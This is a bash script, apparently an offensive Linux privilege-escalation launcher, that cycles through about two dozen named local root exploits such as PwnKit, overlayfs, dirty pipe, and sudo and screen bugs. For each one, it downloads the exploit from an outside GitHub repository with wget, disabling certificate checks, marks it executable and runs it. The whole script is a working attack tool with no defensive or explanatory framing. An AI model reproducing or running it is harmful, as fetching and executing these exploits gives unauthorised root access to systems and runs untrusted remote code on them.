#!/bin/bash
clear
echo "==================================================="
echo "    LPE automation included compiled exploit"
echo "                  by 1K4lL_*"
echo "==================================================="

cve=(
    PwnKit
    overlayfs
    sudoroot
    gameoverlay
    dirty_sockv2.py
    cve-2017-16995
    dpipe
    ofs64
    ofs32
    raceabrt
    ptrace_traceme_root
    lpe.sh
    screenroot.sh
    CVE-2025-0927
    upstream44
    exploit_cent7_userspec.py
    exp_file_credential
    timeoutpwn
    exploit_timestamp_race
    exploit_defaults_mailer.py
    exploit_nss.py
    screen.sh
    gasken
)

for cvenya in "${cve[@]}"; do
    echo " "
    echo "[+] Trying Exploit $cvenya"
    wget -q --no-check-certificate https://raw.githubusercontent.com/justikail/darklab/refs/heads/main/files/$cvenya >/dev/null 2>&1
    chmod +x $cvenya
    if [[ "$cvenya" =~ "dpipe" ]];
    then
    ./$cvenya --root
    else
      if [[ "$cvenya" =~ ".py" ]];
      then
       python3 $cvenya
      else
        if [[ "$cvenya" =~ "raceabrt" ]];
        then
           ./$cvenya
        else
         ./$cvenya
        fi
       fi
    fi
done
